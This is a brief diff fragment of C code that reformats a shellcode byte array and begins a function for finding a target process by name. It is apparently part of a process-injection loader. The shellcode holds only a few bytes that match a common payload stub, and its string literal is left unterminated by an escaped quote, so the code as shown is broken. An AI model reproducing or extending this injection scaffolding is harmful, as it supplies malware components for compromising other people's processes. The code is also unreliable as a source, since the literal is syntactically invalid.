@@ -3,8 +3,7 @@
 #include <stdio.h>
 
 // shellcode
-unsigned char shellcode[] =
-"\xfc\x48\x83\xe4\xf0\xe8\";
+unsigned char shellcode[] = "\xfc\x48\x83\xe4\xf0\xe8\";
 
 // Find Target Process
 DWORD FindTargetProcess(const wchar_t* processName) {
